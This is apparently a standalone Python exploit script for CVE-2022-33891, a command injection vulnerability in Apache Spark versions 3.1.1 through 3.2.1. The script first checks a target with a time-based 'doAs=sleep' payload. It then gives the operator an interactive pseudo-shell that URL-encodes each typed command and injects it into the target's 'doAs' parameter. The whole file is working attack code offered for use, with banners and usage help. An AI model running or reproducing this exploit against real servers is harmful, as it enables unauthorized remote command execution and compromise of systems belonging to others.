#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# ================================= #
#                                   #
# CVE-2022-33891 Exploit .          #
# Created By : Dr.Linux             #
# My GitHub ID : DrLinuxOfficial    #
#                                   #
# ================================= #



from urllib.parse import quote
import os
import sys
import subprocess
import pip
import random
import platform
import time


class Exploit:
    def __init__(self):
        try:
            import requests
            global requests
        except ModuleNotFoundError:
            self.__PackageInstaller__("requests")

        try:
            import colorama
        except ModuleNotFoundError:
            self.__PackageInstaller__("colorama")

        if (platform.uname()[0]) == "Windows":
            colorama.init()

        self.__Exploit__()

    def __PackageInstaller__(self, PackageName):
        try:
            pip.main(["install", PackageName])
        except AttributeError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", PackageName])
        os.execl(sys.executable, sys.executable, *sys.argv)

    def __ClearShell__(self):
        if (platform.uname()[0]) == "Linux":
            os.system("clear")
        elif (platform.uname()[0]) == "Windows":
            os.system("cls")

    def __Writer__(self, data):
        for i in data:
            print(i, end="", flush=True)
            time.sleep(0.1)

    def __Banner__(self):
        self.__ClearShell__()
        self.__Writer__("\033[32;1m  _____   _____   ___ __ ___ ___   ________ ___ ___  _ \n / __\ \ / / __|_|_  )  \_  )_  )_|__ /__ /( _ ) _ \/ |\n| (__ \ V /| _|___/ / () / / / /___|_ \|_ \/ _ \_, /| |\n \___| \_/ |___| /___\__/___/___| |___/___/\___//_/ |_|\033[0;m\n\n\t\t\033[31;1mCreated\033[0;m \033[36;1mBy\033[0;m : \033[33;1mDr\033[0;m.\033[33;1mLinux\033[0;m\n\n")

    def __CheckTargetURL__(self, url):
        if (url.startswith("https://")) == True:
            return url
        elif (url.startswith("http://")) == True:
            return url
        else:
            return ("http://" + url)

    def __CheckVuln__(self, url):
        check_time = random.randint(7, 9)
        payload = (f"?doAs=sleep%20{check_time}")
        try:
            res = requests.get(url + payload)
        except Exception:
            return False
        else:
            if (res.elapsed.total_seconds()) >= (check_time):
                return True
            else:
                return False

    def __Shell__(self, url):
        payload = "?doAs="
        while True:
            command = quote(input(f"\033[32;1muser@{url.replace('https://', '').replace('http://', '').replace('/','').strip().split(':')[0]}\033[0;m:\033[34;1m~\033[0;m\033[31;1m#\033[0;m "))
            command = (payload + command)
            try:
                requests.get(url + command)
            except Exception:
                print(f"Cannot \033[36;1mConnect\033[0;m To \033[31;1m{url}\033[0;m")

    def __Exploit__(self):
        self.__ClearShell__()
        if (len(sys.argv)) == 1:
            print("Help Of \033[32;1mCVE-2022-33891\033[0;m \033[31;1mExploit\033[0;m :\n\n   This \033[31;1mExploit\033[0;m For \033[34;1mApache Spark\033[0;m \033[33;1mVersions\033[0;m : 3.1.1, 3.1.2, 3.2.0 , 3.2.1\n\n\033[35;1mUsage\033[0;m :\n\t python3 Exploit.py \033[36;1mIP\033[0;m or \033[36;1mDomain\033[0;m\n")
            os._exit(0)

        target_url = self.__CheckTargetURL__((sys.argv[1]))

        self.__Writer__(f"Start \033[33;1mChecking\033[0;m \033[32;1mVulnerability\033[0;m For \033[31;1m{target_url}\033[0;m \033[35;1m...\033[0;m\n\n")

        vuln_check = self.__CheckVuln__(target_url)
        if vuln_check == False:
            print(f"Not Found \033[32;1mVulnerability\033[0;m in \033[31;1m{target_url}\033[0;m .\n")
            os._exit(0)

        self.__Writer__(f"\033[31;1mAlert\033[0;m \033[33;1m!!!\033[0;m Found \033[32;1mVulnerability\033[0;m in \033[36;1m{target_url}\033[0;m\n")
        time.sleep(3)
        self.__Banner__()
        self.__Shell__(target_url)


try:
    Exploit()
except KeyboardInterrupt:
    print("\n\n\033[31;1mExit\033[0;m !!!\n")
